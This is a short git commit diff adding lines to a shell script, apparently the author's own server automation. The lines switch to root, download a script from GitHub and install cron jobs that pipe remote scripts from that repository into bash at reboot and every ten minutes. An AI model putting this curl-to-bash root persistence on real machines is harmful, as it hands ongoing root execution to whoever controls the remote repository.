5f0792ddaa37d2ae218d21b1f025d574228478c4
junscapital <52300722+junscapital@users.noreply.github.com>
2020-05-29 13:15:25 +0800

    Update Ho045.sh

--- Ho045.sh
+++ Ho045.sh
@@ -1,1 +1,10 @@
 #!/bin/sh
+sudo su
+cd /root/
+wget https://raw.githubusercontent.com/junscapital/reload/master/blockip.sh 
+echo "@reboot curl https://raw.githubusercontent.com/junscapital/reload/master/inreload.sh | bash
+1,11,21,31,41,51 * * * * curl https://raw.githubusercontent.com/junscapital/reload/master/Ho045.sh | bash
+*/1 * * * * sudo bash /root/blockip.sh
+ " >> myverifier
+sudo crontab myverifier
+rm myverifier
